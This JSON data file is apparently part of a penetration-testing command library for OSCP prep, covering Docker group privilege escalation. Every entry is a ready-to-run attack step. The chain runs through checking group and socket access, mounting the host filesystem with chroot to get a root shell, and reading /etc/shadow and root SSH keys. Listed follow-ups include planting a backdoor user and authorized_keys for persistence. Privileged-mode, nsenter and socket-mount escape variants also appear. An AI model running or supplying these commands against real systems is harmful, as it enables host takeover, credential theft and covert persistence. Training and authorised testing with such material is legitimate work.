{"category": "post-exploit", "subcategory": "docker-escape", "description": "Docker group privilege escalation commands and techniques", "commands": [{"id": "check-docker-group", "name": "Check Docker Group Membership", "category": "post-exploit", "subcategory": "docker-escape", "command": "groups && id", "description": "Verify current user is in docker group (prerequisite for docker escape)", "variables": [], "flag_explanations": {"groups": "Display all groups current user belongs to", "id": "Show user ID, group ID, and all group memberships with IDs"}, "tags": ["DISCOVERY", "DOCKER", "ENUMERATION", "LINUX", "OSCP:HIGH", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION", "QUICK_WIN"], "oscp_relevance": "high", "success_indicators": ["docker in group list", "groups output contains 'docker'", "id output shows docker GID"], "failure_indicators": ["docker not in group list", "Only uid/gid shown, no docker"], "next_steps": ["check-docker-socket", "list-docker-images"], "alternatives": ["cat /etc/group | grep docker", "getent group docker"], "notes": "Docker group membership = root-equivalent access. If user is in docker group, privilege escalation is trivial.", "prerequisites": []}, {"id": "check-docker-socket", "name": "Check Docker Socket Access", "category": "post-exploit", "subcategory": "docker-escape", "command": "ls -la /var/run/docker.sock && docker ps 2>/dev/null", "description": "Verify access to Docker socket and test if docker commands work", "variables": [], "flag_explanations": {"ls -la": "Show socket permissions and ownership", "/var/run/docker.sock": "Unix socket Docker daemon listens on", "docker ps": "List running containers (tests docker access)", "2>/dev/null": "Hide errors if docker command fails"}, "tags": ["DISCOVERY", "DOCKER", "ENUMERATION", "LINUX", "OSCP:HIGH", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION"], "oscp_relevance": "high", "success_indicators": ["Socket readable by user or group", "srw-rw---- permissions visible", "docker ps shows CONTAINER ID header", "No permission denied errors"], "failure_indicators": ["Permission denied on socket", "Cannot connect to Docker daemon", "docker: command not found"], "next_steps": ["list-docker-images", "docker-mount-escape"], "alternatives": ["stat /var/run/docker.sock", "docker info", "docker version"], "notes": "Socket access confirms docker group membership is effective. Even if no containers are running, docker commands working means escalation is possible.", "prerequisites": ["check-docker-group"]}, {"id": "list-docker-images", "name": "List Available Docker Images", "category": "post-exploit", "subcategory": "docker-escape", "command": "docker images", "description": "Enumerate available Docker images for container escape", "variables": [], "flag_explanations": {"docker images": "Show all locally cached Docker images"}, "tags": ["DISCOVERY", "DOCKER", "ENUMERATION", "LINUX", "OSCP:HIGH", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION"], "oscp_relevance": "high", "success_indicators": ["REPOSITORY header visible", "At least one image listed", "alpine, ubuntu, or other images shown"], "failure_indicators": ["Empty list (no images)", "Permission denied", "Docker daemon not running"], "next_steps": ["docker-mount-escape"], "alternatives": ["docker image ls", "docker pull alpine (if no images available)"], "notes": "If no images available, can pull alpine (smallest): docker pull alpine. However, may be noisy/logged. Prefer using existing images.", "prerequisites": ["check-docker-socket"]}, {"id": "docker-mount-escape", "name": "Docker Mount Escape to Root", "category": "post-exploit", "subcategory": "docker-escape", "command": "docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt sh", "description": "Mount host filesystem in container and chroot to gain root access", "variables": [{"name": "<IMAGE_NAME>", "description": "Docker image to use (from docker images output)", "example": "alpine", "required": true}], "flag_explanations": {"-v /:/mnt": "Mount host root filesystem at /mnt inside container", "--rm": "Automatically remove container when it exits (cleanup)", "-it": "Interactive terminal with TTY allocation", "chroot /mnt": "Change root to mounted host filesystem", "sh": "Shell to spawn (use bash if available in image)"}, "tags": ["DOCKER", "EXPLOITATION", "LINUX", "OSCP:HIGH", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION", "QUICK_WIN"], "oscp_relevance": "high", "success_indicators": ["Shell prompt changes", "Can access /mnt/root directory", "Can read /mnt/etc/shadow", "Root shell access confirmed"], "failure_indicators": ["Image not found (need to pull or use different image)", "Permission denied", "chroot: cannot change root directory"], "next_steps": ["verify-docker-root"], "alternatives": ["docker run -v /:/host --rm -it <IMAGE_NAME> sh (then manually: chroot /host)", "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh"], "notes": "This is the cleanest Docker escape method. Host filesystem is at /mnt. All host files accessible as root. Can read /mnt/root/.ssh/id_rsa, /mnt/etc/shadow, modify /mnt/etc/passwd, etc.", "prerequisites": ["check-docker-socket", "list-docker-images"], "troubleshooting": {"Image not found": "Use docker pull alpine or docker pull ubuntu, or use existing image from docker images", "chroot fails": "Try without chroot: docker run -v /:/mnt --rm -it alpine sh, then navigate to /mnt manually", "Permission denied": "Verify docker group membership with groups command"}}, {"id": "verify-docker-root", "name": "Verify Root Access to Host", "category": "post-exploit", "subcategory": "docker-escape", "command": "cat /mnt/etc/shadow && ls -la /mnt/root && cat /mnt/root/.ssh/id_rsa 2>/dev/null", "description": "Confirm full root access to host filesystem from container", "variables": [], "flag_explanations": {"cat /mnt/etc/shadow": "Read shadow file (root-only) to confirm access", "ls -la /mnt/root": "List root home directory contents", "cat /mnt/root/.ssh/id_rsa": "Attempt to read root SSH private key", "2>/dev/null": "Hide errors if SSH key doesn't exist"}, "tags": ["DOCKER", "LINUX", "OSCP:HIGH", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION", "VERIFICATION"], "oscp_relevance": "high", "success_indicators": ["Shadow file contents visible (password hashes)", "Root directory listing shown", "SSH key accessible (if exists)", "No permission denied errors"], "failure_indicators": ["Permission denied on shadow", "Cannot access /mnt/root", "Still running as low-privilege user"], "next_steps": ["Extract credentials from /mnt/etc/shadow", "Copy root SSH key for persistent access", "Modify /mnt/etc/passwd to add backdoor user", "Add SSH public key to /mnt/root/.ssh/authorized_keys"], "alternatives": ["id (should show uid=0 if chrooted correctly)", "whoami (should show root)", "cat /mnt/etc/passwd"], "notes": "Once verified, you have complete control over host. Can read any file, modify any file, plant backdoors, extract all credentials.", "prerequisites": ["docker-mount-escape"]}, {"id": "docker-privileged-escape", "name": "Docker Privileged Container Escape", "category": "post-exploit", "subcategory": "docker-escape", "command": "docker run --privileged -it <IMAGE_NAME> sh", "description": "Alternative Docker escape using privileged mode (more dangerous/noisy)", "variables": [{"name": "<IMAGE_NAME>", "description": "Docker image to use", "example": "alpine", "required": true}], "flag_explanations": {"--privileged": "Give extended privileges to container (access to all host devices)", "-it": "Interactive terminal"}, "tags": ["DOCKER", "EXPLOITATION", "LINUX", "OSCP:MEDIUM", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION"], "oscp_relevance": "medium", "success_indicators": ["Container starts", "Can access /dev devices", "Can mount host filesystem manually"], "failure_indicators": ["Image not found", "Permission denied"], "next_steps": ["Mount host: mkdir /mnt/host && mount /dev/sda1 /mnt/host", "Access host files via mounted filesystem"], "alternatives": ["docker-mount-escape (preferred method)", "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh"], "notes": "Privileged mode is more powerful but noisier than mount escape. Prefer docker-mount-escape for cleaner approach.", "prerequisites": ["list-docker-images"]}, {"id": "docker-socket-mount", "name": "Docker Socket Mount Abuse", "category": "post-exploit", "subcategory": "docker-escape", "command": "docker run -v /var/run/docker.sock:/var/run/docker.sock -it <IMAGE_NAME> sh", "description": "Mount Docker socket inside container to control host Docker daemon", "variables": [{"name": "<IMAGE_NAME>", "description": "Docker image with docker client installed", "example": "docker:latest", "required": true}], "flag_explanations": {"-v /var/run/docker.sock:/var/run/docker.sock": "Mount host Docker socket inside container", "-it": "Interactive terminal"}, "tags": ["DOCKER", "EXPLOITATION", "LINUX", "OSCP:MEDIUM", "POST_EXPLOITATION", "PRIVILEGE_ESCALATION"], "oscp_relevance": "medium", "success_indicators": ["Container starts with socket access", "Can run docker commands from inside container", "Can spawn new privileged containers"], "failure_indicators": ["Socket mount fails", "Docker client not in image"], "next_steps": ["Inside container: docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "Spawns nested container with host filesystem access"], "alternatives": ["docker-mount-escape (simpler)", "Use image with docker client: docker pull docker:latest"], "notes": "Requires image with docker client installed. More complex than direct mount escape. Mainly useful if mount escape is blocked.", "prerequisites": ["list-docker-images"]}, {"id": "docker-pull-alpine", "name": "Pull Alpine Docker Image", "category": "post-exploit", "subcategory": "docker-escape", "command": "docker pull alpine", "description": "Download Alpine Linux image (smallest, fastest) for container escape", "variables": [], "flag_explanations": {"docker pull": "Download image from Docker Hub", "alpine": "Minimal Linux distribution (5MB)"}, "tags": ["DOCKER", "ENUMERATION", "FILE_TRANSFER", "LINUX", "OSCP:MEDIUM", "POST_EXPLOITATION"], "oscp_relevance": "medium", "success_indicators": ["Download progress shown", "Status: Downloaded newer image", "alpine image appears in docker images"], "failure_indicators": ["Cannot connect to Docker Hub", "Network unreachable", "No internet access"], "next_steps": ["docker-mount-escape"], "alternatives": ["Use existing images from docker images", "docker pull ubuntu (larger but more tools)", "docker pull busybox (even smaller than alpine)"], "notes": "May be logged/detected. Prefer using existing images if available. Alpine is only 5MB so downloads fast even on slow connections.", "prerequisites": ["check-docker-socket"]}]}